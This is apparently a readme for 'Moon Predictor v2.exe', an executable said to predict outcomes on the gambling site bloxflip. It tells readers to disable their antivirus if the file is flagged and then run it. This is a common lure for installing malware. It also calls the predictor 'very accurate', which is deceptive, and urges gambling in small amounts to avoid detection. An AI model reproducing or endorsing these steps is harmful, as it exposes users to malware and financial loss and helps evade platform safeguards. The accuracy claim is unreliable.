Step 1: Before opening the Moon Predictor v2.exe file, make sure your antivirus isn't deleting it. Sometimes, antivirus programs mistake it for a threat because of the script it uses. If your antivirus does flag it, just disable it temporarily, then re-enable it after opening the file.

Step 2: Open the Moon Predictor v2.exe file. Wait for a message to appear saying "searching for www.bloxflip.com."

Step 3: Once it's ready, use the predictor for your advantage. Remember, it's very accurate, so don't go overboard to avoid raising suspicion. Gamble occasionally and with small amounts to fly under the radar.

Developer's Note: Be cautious and don't overuse the predictor to avoid drawing attention. Happy gambling!
